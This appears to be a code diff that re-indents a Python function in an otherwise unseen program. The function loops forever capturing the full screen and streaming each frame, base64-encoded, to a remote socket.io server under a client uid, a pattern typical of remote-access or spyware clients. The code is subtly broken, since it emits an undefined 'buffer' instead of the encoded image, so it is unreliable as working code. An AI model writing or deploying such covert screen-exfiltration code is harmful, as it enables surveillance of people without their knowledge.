@@ -137,17 +137,17 @@ def run(data):
     def take_screenshots(sio, uid):
         while True:
             with mss.mss() as sct:
-            # Capture the entire screen
-            monitor = sct.monitors[0]
-            screenshot = sct.grab(monitor)
+                # Capture the entire screen
+                monitor = sct.monitors[0]
+                screenshot = sct.grab(monitor)
 
-            # Convert to PNG
-            png = mss.tools.to_png(screenshot.rgb, screenshot.size)
+                # Convert to PNG
+                png = mss.tools.to_png(screenshot.rgb, screenshot.size)
 
-            # Encode as base64
-            base64_string = base64.b64encode(png).decode('utf-8')
+                # Encode as base64
+                base64_string = base64.b64encode(png).decode('utf-8')
 
-            sio.emit("screenshot", {"uid": uid, "image": base64.b64encode(buffer).decode('utf-8')})
+                sio.emit("screenshot", {"uid": uid, "image": base64.b64encode(buffer).decode('utf-8')})
 
 
 
